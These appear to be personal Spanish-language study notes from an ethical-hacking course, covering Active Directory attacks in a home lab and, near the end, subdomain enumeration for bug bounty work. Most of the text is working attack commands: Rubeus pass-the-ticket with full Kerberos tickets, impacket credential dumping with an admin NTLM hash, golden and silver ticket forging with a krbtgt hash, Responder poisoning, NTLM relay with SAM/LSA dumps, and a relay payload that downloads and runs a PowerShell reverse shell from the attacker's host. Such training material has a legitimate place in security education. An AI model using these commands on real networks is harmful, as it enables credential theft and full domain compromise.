4LhPmD4V2+zFPTKZBvdm+lu6vVuTDXlL7IJv5wlEuBgVah+g+Kj5YLpA3KG3N1MZBcZnWOvuGNQWL5SU0yQpcEgIBOMf57wTZWyDeZHGhf9SfSiELmZ2spTaJ+yxJ2mtX9ahwY8XFWCrxsBkJtaTTe3e09CksYIS4ziPro9bQV1UTMufSDB1YVs21+lrAkCQcx82bFFtXFAPeQPaB9McvEq6FHCqaAnSZo4HlMIHioAMCAQCigdoEgdd9gdQwgdGggc4wgcswgcigKzApoAMCARKhIgQgOFxmV6Qb5rakNq5xbgOSUp15Ils+q0hI+gkrZam85rKhDBsKQ09SUC5MT0NBTKIaMBigAwIBAaERMA8bDUFkbWluaXN0cmFkb3KjBwMFAEDhAAClERgPMjAyNDA1MTAwMjQwMzlaphEYDzIwMjQwNTEwMTI0MDM5WqcRGA8yMDI0MDUxNzAyNDAzOVqoDBsKQ09SUC5MT0NBTKkfMB2gAwIBAqEWMBQbBmtyYnRndBsKQ09SUC5MT0NBTA== 
Que es este, lo usaremos en el siguiente comando 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
.\Rubeus.exe asktgs /ticket:ticket anterior /service:cifs/DC01.corp.local
le diremos que usando ese ticket de administrador nos abra el servicio de cifs que se encuentra en DC01
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Lo que vimos anteriormente es como inyectar grand tcket en seccion de otro usuario, en el curso no se necesito
ser administrador, solo que inicien seccion en mi maquina WS02


En esta ocacion utilizaremos el hash de administrador para volcarlo utilizando Rubeus

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
.\Rubeus.exe asktgt /domain:corp.local /user:administrador /rc4:eef6eedd62257ff1ffdc29dd61add972
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Con esto obtendremos el ticket gran ticket y su clave de seccion, con esto nos podemos evitar el hasheo 
utilizando jhon the ripper , nos saltamos ese paso y podemos utilizar este gran ticket para utilizar cualquier
servicio como administrador.

Para eso realizamos lo mismo que anteriormente, usamos en mi caso emacs en mi maquina host y con los
comandos alt+x replace-string, espacio, luego enter eliminamos los espacios del gran ticket y estaria listo para usar

Ahora podemos pasar a utilizar un servicio


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
.\Rubeus.exe asktgs /ticket:doIFIDCCBRygAwIBBaEDAgEWooIENjCCBDJhggQuMIIEKqADAgEFoQwbCkNPUlAuTE9DQUyiHzAdoAMCAQKhFjAUGwZrcmJ0Z3QbCmNvcnAubG9jYWyjggPyMIID7qADAgESoQMCAQKiggPgBIID3DVFSB6JkvhrYwj9pbhLz2Fu7BJ88ZKtc/c7JHH1XPN6GisBGLq4BvY9DfvkehPn7AuqaTf5aWhgH5LvP+OWfDgeDAbfOys5XD5/C1M0fzWSaxALT/2rJ3jEuABninfGyo4ME6dbFVo+1Hhym4dbdYPaINHMJ455pjnNwkMWHqJUszuQe35htqHcX1CeJBZwKSeJyv/YX1iH5tb+BUKMOXvN0lA5eDISz6z6lFJPTiAphvlv9jbFHVrB6qhECe+p8E48LRRme+T1OIinJcGk553Xw8MXE02cARYQekPkigU9KJUuOA6u5+XNiFFK5vQRo1eIplVtpRnao54GMSviBxYvBOIA8UbBCa15nb2XQ0QNCPs/WdGUNfW5peRLOop8D9feJ/qxAefCxyXum4sAETRwwsL/N70ctkqsY10XWlze04TtVFw6TGy633llZCVKXaMZFSgtc/44hUwbOpm6Ci2yhskH+Gu+njN+0os68kuHyJ01DTYUyfaga2h4ajXEuVQdDT/ko04cN0m+MGank8NiCVU3yhZYnivhNlIvSTdftEdmnxzHVkoTpD5gAtHmd1q1CQYYgpPclnCuNwBFWFI373ZSr7G45VhPgJjvnGhhdSeOJandjJh9JsinljhtVTf+yjv4gpbVrSD/Pi2/c1RYBETYYyJZVRQHFBoYEf7j5UoX2UdVLEbukospYSg41y/djAcLYmdRRX52quAFZ72lME3CFpwjZLHmbck1VP6x/QB4/UUWpeg9C0cWbSD/8/FNmJdgRz+3di6KFmv1G0ecwPd/dH3JQhJd4ji3ouFqv2XBNw0BA1xBwzESatFY4C0WZO3Sq2Z35M6Fcknv/FQpWrIeopKe2M59CBEfoEHi4wfTx8CrVSgMOkwYHQbQYpbTIUB14C5DL2oImtVIKYmfg0c34EfZx14SN30t1XPd30/N6J+nS2fZ5lR7pVbYolaAgMbJZDlHUCorxBNlQEkG+R5beBrasX/u/F3WuUT/9C78GhJ2X11Sfd4AfUy2FsWmZkkiHjzlyLSg8OBkD/nmGoRW9/sMFlDCiUaQhU5qpI6Aua5ioDusMTElXSoMm+/RiNtp6BHRKJRxzMl+4J6nobfB6X6EPI0ZDr3z9mmPlHn9m8ptMM1KG/S31fFGxRp59XzWvsj6zi+27RG0KDQW2v0BbQsN2Vw3d70fcr0TGQiKPNHh9lNHDN8FSQnml0mSXLtbyIP+PzjEnho3zH2LBZIZjLWNqMrvqHqOq63ToeEXoR68JcXxpr7B0z9hLLvRE/4DeSyLauxYkRG3mM4/BjW3z+5wyw79qXWjgdUwgdKgAwIBAKKBygSBx32BxDCBwaCBvjCBuzCBuKAbMBmgAwIBF6ESBBBAuhU59YVTpHWe6exPa0kEoQwbCkNPUlAuTE9DQUyiGjAYoAMCAQGhETAPGw1hZG1pbmlzdHJhZG9yowcDBQBA4QAApREYDzIwMjQwNTExMDExNDMyWqYRGA8yMDI0MDUxMTExMTQzMlqnERgPMjAyNDA1MTgwMTE0MzJaqAwbCkNPUlAuTE9DQUypHzAdoAMCAQKhFjAUGwZrcmJ0Z3QbCmNvcnAubG9jYWw= /service:cifs/DC01.corp.local
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Esto lo realizamos anteriormente, solamente lo repito porque no termine el proceso.

Lanzamos la solicitud para utilizar el servicio cifs

y realizamos el mismo paso con el nuevo grand ticket como el anterior para eliminar el espacio

En caso de estar en maquina atacante realizamos el proceso para usar el gran ticket

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
.\Rubeus.exe ptt /ticket:doIFbjCCBWqgAwIBBaEDAgEWooIEcTCCBG1hggRpMIIEZaADAgEFoQwbCkNPUlAuTE9DQUyiIjAgoAMCAQKhGTAXGwRjaWZzGw9EQzAxLmNvcnAubG9jYWyjggQqMIIEJqADAgESoQMCAQWiggQYBIIEFNsAMtcJIBizSCJkl863OGeoHCpKNDJ/+z7SARmJ4E4eri+uff4L1haYc+ELjZwOJHp9tzLweu9cng++AjHsj3bLQROLFYGgicOPaX2uwTHMP8dYTmJWu1fQXXmSZ5LJZXV5g9es0W6tVswWIeUvWsqejopgdbzg+QRF7XOgUPwiB4nXTF81DuxYUDOHZHuQIpjgTQ6Bc2B++n066/K0ZgVS7RX0iC3PQQz0teNdlPWGMDaXhXbHRnpxlXtPv6qVxaUoe/XVSix0euiqnchgFp8D4/QcBu/SsGs+XRTc2tXrMcNUssvAs74EEGTotk+gERCA+3FUBKztyw7IpxebYdXFrCsUzGJx/OklVhSYEE3CsR+7aTzr923oztlvCpp1NMrrIi78JSvradE+pPB0bMCjbT74l2Aq7qXz/+q3Npd4C5vTCB1aigMY60NjEZDa7QIYmdhPxcAEOLrwXXj+ojF0rXW+dq1CmPu1meE7dYoFNUh+n+yW98GMa61d5Oa3rDMsl9oPiNeAatIss5i8Xiz15de7pT2q7a+7FSHehikvOxSmHF/dWgALBjjAI4o+PDyeqcrZtVExB2NPYUZZ7PiDcwJ1uIQwxJ2yUtZrONeex3OywerrAAmoyDp1NP3Q1ea8VG51GxppLza/gLgab5h/w15BbXkefJJri5H9RnEBFz0VcqLkLWJyrKcnkClUySOCedQAk1OVaH9a6G5o1ObS9UrruocU8KdykCQvbDBEsu1lF/nvZLq40dHP0aQGAyJ9Aw+FDq7XIaVb3/Gz23NZ8gQ2VqpJOR2tToXMwPr1yauLU7gVTc7hrXMDjPGXKrAUaDf7vFPNVNUidPyYOYkjqc1RVikbnnq4fA7ZtIX2horQHU4ZhQhICPAoD/C0v3krDwC9Exu7ITnK+h1SxrPlpxgkfAfD7wViLg4dwvhqDJp+Sj0lWZg1Ckq35cSfd9CjDJTs8DcTZZ39YXVkbvkvXJ64NYFv5OfezcqPaleGmsTLRm78625gqjMKfmVXCy3B/n+3h6Lx7Me95LFtB4/c/XANxKLBLQMUH7Nc78gEm2GKR0f8T4cCaa7li1KRCW+5dPQ50JQEj1hKWA+L/snA9qMEGerg6Gw+MZO2HNW5eBNMtSZd6y/VOV10HOUbw5vsji8FhQ0wQWy9ctdS1J1A+pvbhTqLn1LY+nX968fCyUUydCfcfaaviuaGOXPx+qm6viMPWo2Z8xIp9/48lKuGQI0oSJca7l864qxDvgtpq29bsi4+zcf2oJTcywApShrwG6jEdbrDZZzzp60rBo3PaXE4NlKf7ysDOi/Mpqg1BD4oYTQD5puD7UFFhntekEJtrEXH3bk+aRZcoRc+GQWoofMT1FU+eZ2IGQmt9EsvgJd4zqOB6DCB5aADAgEAooHdBIHafYHXMIHUoIHRMIHOMIHLoCswKaADAgESoSIEINcRhuXAzOWvk83kJ7wFOIm2/WE/2SfFow11krVnUPq2oQwbCkNPUlAuTE9DQUyiGjAYoAMCAQGhETAPGw1hZG1pbmlzdHJhZG9yowcDBQBApQAApREYDzIwMjQwNTExMDEyNDM0WqYRGA8yMDI0MDUxMTExMTQzMlqnERgPMjAyNDA1MTgwMTE0MzJaqAwbCkNPUlAuTE9DQUypIjAgoAMCAQKhGTAXGwRjaWZzGw9EQzAxLmNvcnAubG9jYWw=
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Luego de esto se nos dira importacion de ticket con exito y al ingresar klist nuestro usuario empleado2 podra usar el servicio cifs


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Servidor: cifs/DC01.corp.local @ CORP.LOCAL, ahora podemos usar este servicio.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Ahora realizaremos los mismo pasos anteriores pero con kali linux
para ello el siguiente comando

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
impacket-getTGT corp.local/administrador -hashes :eef6eedd62257ff1ffdc29dd61add972
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Con esto se nos creara un ticket del usuario administrador
Cabe destacar que el hash utilizado es de ntlm rs4 que por defecto posee la session key y credenciales de usuario
Con esto podemos usar el servicio que queramos

Para ver las opciones

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
impacket-secretsdump -h
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Aqui podremos fijarnos en la opcion k que nos dice que utilizara el hash dekerberos, utilizaremos un comando
para indicar el mismo

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
export KRB5CCNAME=/Desktop/administrador.ccache
tener en cuenta que debemos de ejecutarlo en el lugar donde se escuentra para evitar el error 21, en mi caso cuando consegui el tgt lo deje en kali, luego este comando
lo ejecute en el mismo lugar ya que de moverlo no podia ejecutar los ultimos comando para tomar control de las maquinas.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Luego de esto pasamos al siguiente comando

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
impacket-secretsdump corp.local/administrador@WS02.corp.local -k -no-pass

Indico con -k que utilice la autenticacion de kerberos y luego que no sea necesario la contrasena
ya que se estara utilizando el hash
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Otro seria

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
impacket-psexec corp.local/administrador@DC01.corp.local -k -no-pass
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Esto nos proporciona permisos de administrador sobre la maquina y una shell reverse

Debemos de ver mas opciones de impacket, otro seria

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
impacket-smbexec corp.local/administrador@DC01.corp.local -k -no-pass
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Tambien nos permite estar dentro de la maquina DC01

Otro

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
impacket-getST -spn cifs/DC01.corp.local -no-pass -k corp.local/administrador
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


En esta ocacion se hablara de que es golden tickets y silver tickets video 66

Estas dos herramientas tratan de crear nuestro propio tickect grand tiket basandose en que ya tenemos el hash 
de inicio de sessionc krbgt del usuario, en este caso el ntlm del usuario administrador que pudimos volcar por la
vulnerabilidad encontrada, aunque no se pueda hashear hemos visto que se puede usar como llave para violar
el servicio de kerberos y en este caso no sera la excepcion.


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
impacket-secretsdump administrador@192.168.0.7 -hashes :eef6eedd62257ff1ffdc29dd61add972
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Volcamos la informacion de la maquina principal windows servers, usuarios y sus claves en hash
entre ellos el que mencionamos anteriormente el usuario krbtgt.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
Este sera el volcado en como tendremos los hashes, lmhash y nthash
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Copiasmos el lado derecho del usurio krbtgt como lo vimos anteriormente sera ntlm es decir nthash

Ahora bien, como crear el ticket grand ticket, pues de la siguiente forma

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
impacket-ticketer -nthash “hashs ntlm del usuario kgbtgt -domain-sid ”este lo conseguimos al ingresar
al usuario de administrador de la maquina victima como lo realizamos al escalar al usuario active directory
e ingresar Get-Addomain" -domain corp.local el nombre del dominio y por ultimo el nombre del usuario a 
atacar en este caso administrador, y quedaria de la siguiente forma.

impacket-ticketer -nthash e5106e9870027f7e86c0a6189f1dd12e -domain-sid S-1-5-21-1087878042-4283918813-3206888575 -domain corp.local administrador
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Esta tecnica es la llamada golden ticket , la otra llamada silver ticket es para el ticket de servicio

Ahora tenemos nuestro ticket golden ticket Saving ticket in administrador.ccache, se guardara con este nombre

Como anteriormente realizamos es hacer la siguiente tecnica con el siguiente comando para utilizar el archivo
.ccache anterior

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
export KRB5CCNAME=/home/kali/administrador.ccache
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Ya una vez indicarle cual usar procederemos a utilizar nuevamente la herramienta impacket

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
impacket-psexec corp.local/administrador@DC01.corp.local -k -no-pass
-k es la autenticacion que kerberos utilizara y cual utilizara? pues KRB5CCNAME
con la direccion que le pasamos anteriormente.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Como en el video 65 varias formas de penentrar como si fuera metasploit, en mi caso -psexec no me funciona pues utilice el siguiente comando y obtuve un reverse

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
impacket-smbexec corp.local/administrador@DC01.corp.local -k -no-pass

me funciono con -smbexec
Este no me permite cd en el comando al contrario del otro cuando ambos me entregan reverse shell de la maquina victima
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Ahora pasaremos a crear el ticket de servicio que en este caso se le llama silver ticket
Lo mismo que el anterior muy parecido a golden ticket a diferencia que este se le anadira -spn para indica el servicio y de donde

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
impacket-ticketer -nthash e5106e9870027f7e86c0a6189f1dd12e -domain-sid S-1-5-21-1087878042-4283918813-3206888575 -domain corp.local -spn cifs/DC01.corp.local administrador
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

luego de esto lo anteriormente visto realizar

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
export KRB5CCNAME=/home/kali/administrador.ccache
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Y luego proceder

En el video 67 lo que vamos a realizar en envenear el protocolo ntlm para posteriormente explotarlo

Se llama ntlm roasting

Ingresamos el comando en la maquina server principal

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
dir \\192.168.0.2\c$ ip de la maquina WS02 y nos mostrara su carpeta compartida
vamos a wireshark en host y filtramos en ntlmssp para los protocolos de ntlm que se mostraran como smb2

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

para eso vamos a cifrar el siguiente codigo o numeracion, esta dentro del protocolo que capturamos anteriormente con el comando ingresado
dentro de security,GSS-api,simple protected,negtokentarg,ntlm, y nos mostrara ntlm server challenge: + la numeracion, la copiamos y seguimos

Lo que intentamos realizar es crear un hash para luego crakear, en mi caso mi wireshark no encontro por el comando anterior ningun parecido con ntlm, solo vere el video
y seguire con las intrucciones.

La enumeracion anterior viene siendo la pregunta del comando, el siguiente comando a necesitar es la respuesta del ntlm
NTLMv2 response, ahi estara la proxima enumeracion que nesecitaremos y tambien mas abajo copiar el valor de NTProofStr

Y lo otro a necesitar seria el user name, que asi mismo se llama el campo en este caso es Administrador.

Toda la informacion obtenida en el siguiente formato

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
UserName::Domain:NTLM_Server_Challenge:NTProofStr:NTLMv2Response-NTProofStr
nombre de usuario,dominio,el challenge , el ntproofstr , la respuesta y ntproofstr
el numero de NTProofStr estara al comienzo de la numeracion de la respuesta, lo vamos a eliminar, si NTProofStr es 1234 y la respuesta es 123456 solo dejaremos 56
por eso el formato dice respuesta - NTProofStr, entonces luego de haber borrado la parte NTProofStr de la respuesta lo enviamos a emacs como admin.ntlmv2
Repito el -NTProofStr no se coloca solo se quita de la respuesta la numeracion de este es decir, usuario,dominio,challenge,NTProofStr y respuesta nada mas
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



luego lo pasamos a jhon en kali y nos volcara la clave de seccion del usuario administrador.

Todo lo anterior es estando dentro de la infraestructura, es decir , estar vinculado de una u otra forma a active directory

Ahora en el video 68 veremos como sin la necesidad de estarlo


En este trabajaremos con dos protocolos, LLMNR y NBNS

En este video haremos que, cuando la maquina victima se intente comunicar con otra maquina interceptaremos la comunicacion y le diremos que se autentique con nosotros
y le tomaremos los datos anteriores que son challenge cifrado y el challenge respuesta

Para aquello utilizaremos una herramienta muy famosa llamada “responder” para envenenar esos dos protocolos mencionados anteriormente.


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
sudo responder -I eth0 y listo con la interfaz solamente captaremos cualquier error de cualquier usuario de una organizacion y obtendremos su credenciales
Luego seria copiar crear con emacs por ejemplo en mi caso admin y empleado2 .ntlmv2 y usar la herramienta john
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



Video 69
firmado smb debe de estar desactivado para que no confirmes los paquetes con el usuario original

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
crackmapexecsmb 192.168.0.0/24
para encontrar en mi red un host
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

SMB         192.168.0.7     445    DC01             
[*] Windows Server 2016 Standard Evaluation 14393 x64 (name:DC01) (domain:corp.local) (signing:True) (SMBv1:True)

Aqui tendra esta firma activa contrario a la maquina windows 10 virtual de empleado2 que la tiene desactivada(signing:False), en este caso trabajaremos con la maquina
empleado2 que ya lo tiene desactivado

Creamos un fichero targets.txt con la ip de la maquina windows10 empleado2 dentro.

Luego con nuestra herramienta impacket

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
impacket-ntlmrelayx -smb2support -tf targets.txt

smb2 que es con la que trabaja windows 10 esa version, y la pasamos el target creado

Esto nos levantara protocoloes y servidores y clientes, recibiremos peticion de cliente y la enviaremos a cliente original como si fueramos cliente
y luego de envenenarlo se verificara con nosotros.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Luego editamos el siguiente archivo

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
sudo emacs /etc/responder/Responder.conf
y colocamos en off smb y http que se nos esta levantando cuando ejecutamos el comando impacket anterior

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Luego pasamos a escuchar el trafico

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
sudo responder -I eth0
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Y cuando intentamos acceder en la maquina administrador entrar a una carpeta por error este nos lanza el hash del administrador,invitado,kali02 y default es decir, los
usuarios de esa maquina.

Tambien puedo interactuar con la maquina ya estando envenenada, simplemente

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
impacket-ntlmrelayx -smb2support -tf targets.txt -socks
luego que termine enter y escribir socks

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Luego vamos a 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
sudo emacs /etc/proxychains4.conf

Le eitamos la ruta a donde dirigir el trafico que genere por el proxy 127.0.0.1 y puerto 1080
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

que es donde esta escuchando el ntlmrelayx del comando anterior con socks

luego

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
proxychains4 crackmapexec smb 192.168.0.2 -u ‘Administrador’ -d ‘corp’
usuario capturado en este caso Adiministrador que nos confirma que tiene privilegios y el dominio

tambien 
proxychains4 crackmapexec smb 192.168.0.2 -u ‘Administrador’ -d ‘corp’ -p ‘12345’
cualquier clave ya que tendremos los paquetes infectados

Algo mas interesante, lanza o volcar las sam
proxychains4 crackmapexec smb 192.168.0.2 -u ‘Administrador’ -d ‘corp’ -p ‘123456’ --sam
y tendremos todas las credenciales de los usuarios del usuario administrador , kali02 como anteriormente

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


De igual forma 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
proxychains4 crackmapexec smb 192.168.0.2 -u ‘Administrador’ -d ‘corp’ -p ‘123456’ --lsa
nos vuelca absolutamente todos los usuarios que han ingresado en la maquina WS02
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



Lo siguiente que haremos es buscar en la web un reverse shell , crear un archivo reverse.ps1 pegamos el comando dentro y lo adjuntamos el comando que 
vimos anteriormente que incluia socks

Luego pasamos a dejar a kali escuchando con

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
python2 -m SimpleHTTPServer
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Y utilizamos el comando que sabemos e sobra para que la otra maquina escargue un archivo de nuestra maquina kali

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
impacket-ntlmrelayx -smb2support -tf targets.txt -c “powershell -c \”IEX(New-Object System.Net>WebClient).DownloadString('http://192.168.0.3:8000/reverse.ps1')\""
misma direccion que le tenemos que indicar al archivo reverse shell ip y puerto que deseemos.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Para escuchar la conexion reversa 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
netcat -lvp mas la ip que colocamos en el fichero en mi caso 5555
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Esto hara que cuando el usuario cometa un error , diremos que esta bien dentro de los paquetes pero por detras ejecutaremos el comando
y ya tendriamos una shell reverse.


Token inpersonation video 70

En esta ocacion utilizaremos metasploit para la utomatizacion de todo lo anterior que vimos
Para esto utilizaremos un comando dentro de metasploit parecido a impacket

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
use exploit/windows/smb/psexec
luego show options
colocamos el rhost, port, smbdomain, smbpass, smbuser, lhost.
para tenerlo en cuenta en el smbpass al igual que la clave tambien se puede colocar el hash
Y esto nos devolvera un meterpreter
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

ingresar ps para ver todos los servicios, y digamos que el administrador abrio una shell o cualquier otro servicio en nuestra maquina
con el comando ps veremos el proceso pero para que quiero saberlo pues, con steal_token_+pid del proceso que ejecuta el administrador
le decimos hey, robate el token de ese usuario y que hara este pues robar las credenciales y autenticarce en los procesos como este,
es decir que cuando ingresemos shell para entrar a la shell y ejecutamos whoami seremos corp/administrador y el proceso que era acceso denegado,
dir \\DC01\c4 ahora lo podremos ejecutar y visualizar.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
steal_token_6876 en mi caso
getuid para ver tipo de permisos o que usuario eres con meterpreter
rev2self para volver al usuario de antes
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Otra forma seria migrar de nuestro pid a otro usuario

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
migrate 6876 y ya tendriamos el mismo resultado como el anterior
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



Veremos mas herramientas para optimizar los procesos anteriores, recordar que los frameworks mas conocidos seran los menos utiles porque seran reconocidos
unos de ellos seria metasploit framework
otro seria empire powershell
otro seria covenant todos estos son para post y explotacion de windows

Instalaremos este ultimo en nustra maquina kali, esta en github como covenant, realizamos el procesos a traves del terminal clonando el repositorio y demas
en mi caso lo realice con docker ya que .net por si misma no funcionaba

Para abrir la app

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
sudo docker run -p 7443:7443 covenant-app
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Primero vamos a crear nuestro listeners, esto nos permitira escuchar asi como hemos visto en metasploit video 71

Luego trabajaremos con los launchers que es lanzar un comando hacia la maquina objetivo con un reverse

en este caso elegimos con extenson o tipo de comando powershell


todo esto en video 71



~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
sharpup 
nos dira nuestro nivel de privilegios
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

No utilice la herramienta covenant ya que no me permite ejecutar el payload por el script en politica que borre al principio de GOP y que en covenant 
sus puertos no se quedan abierto como dice y kali no puede recibir la senal, aun asi covenant a la fecha ya es detectada

Bien ahora pasaremos a hablar de lo que es Bug Bounty, es una aplicacion web de una empresa la cual si encuentras un fallo , una vulnerabilidad en esta
te recompensan economicamente, en el video 74 veremos la metodologia para poder realizar los pasos para este tipo de trabajo 

El primer paso seria leer todos los fallos encontrados recientemente de la app ya que suelen repetirse, una pagina recomendada es

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
pentester land bug bounty
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Ahora video 75, instalamos la maquina vulnerable desde vuln , llamada VPLE, la cual integra muchas paginas como multillidae que se trabajo anteriormente.
Como siempre el mismo problema, la interfaz de la pantalla no nos permite ver todos los datos y esta pantalla no sube o baja para ver dichos datos, realizaremos
el ajuste manual ya que en virtualbox se realiza desde vboxguestadditions, en este caso no hace su funcion.

Video 76, tecnicas de identificacion de subdominios

Para esto una aplicacion llamada subfinder, para descubrir sub dominios, recordando que esto se tratara de como por ejemplo una empresa
nos contrate para realizar una auditoria a su pagina web de una empresa, y no se encuentre nada, recordad que estas paginas en empresas macro o medianas
tambien estan formada de otras paginas de subdominios de la paina principal.

Esto y tenerlo en cuenta, esta herramienta realizara reconocimiento pasivo, palabra que trabajamos con otras herramientas en explotacion en el curso completo

En esta ocasion luego de instalar la herramienta subfinder en kali, pasaremos a utilizar un dominio, es decir una pagina web para analizar sus subdominios

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
subfinder -d hackthissite.org
-d para indicarle el dominio
en esta ocacion se encontraron 44 subdominios
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

para que sirve esto? pues, los subdominios serias gastos extras para la empresa y se les puede olvidar de igual forma aplicarle los paquetes de seguridad
o simplemente obviarlas o no actualizarlas debidamente.

En este caso por ejemplo subdominios de la pagina anterior estan www.hackthissite.org, forums.hackthissite.org, stats.hackthissite.org entre otros

exportamos todo , en mi caso 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
subfinder -d hackthissite.org > subfinder.txt
para luego analizarlos por ejemplo con la herramienta masscan
En mi caso dentro de emacs alt+x luego escribir display-line-numbers-mode, para enumerar los subdominios
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


De acuerdo, luego pasamos a otra herramienta, la llamada sublist3r igual que la anterior, recopila de fuentes publicas y demas, pero al contrario de la anterior
esta integra la herramienta subbrute que te da un poco de anonimato y demas cosas que pueden investigar en github

Bien , instalamos sublist3r para probar, ya saben

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
sudo apt install sublist3r -v
y harmos lo mismo que la anterior
sublist3r -d hackthissite.org
recordad -v para mas informacion igual que nmap
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Este me buscara en diferentes motores de busquedas y en este caso me arrojo 17 subdominios y los SSL (certificados de seguridad).

En este caso utilizaremos tambien la sub herramienta por decirlo asi de sublist3r la llamada subbrute, tener en cuenta que esta es mas fuerte a la hora
de recavar y solo utilizarlas en paginas de dominios en el cual tengan contratos con dicha empresa. Bien seria

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
sublist3r -d hackthissite.or -v -b -o subbrute.txt
-b para subbrute y -o para exportarla en este caso mi fichero se llamara subbrute.txt
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Inmediatamente recominedo precionar Ctrl + c , este metodo (-b) es my intrusivo y aunque podamos en esta pagina lo mejor seria hacerlo

Podemos utilizar 0 anadir APY keys, para esto 


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
emacs .config/subfinder/config.yaml
se encuentra en home/kali, por si se encuentrar fuera de home
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

como en el curso completo, podemos agregar shodan, censys y mas 

Recuerden siempre estudiar mas a fondo y no quedarse con lo que lean o estudien aqui, todas las herramientas que veremos incluyendo sublist3r tienen -h
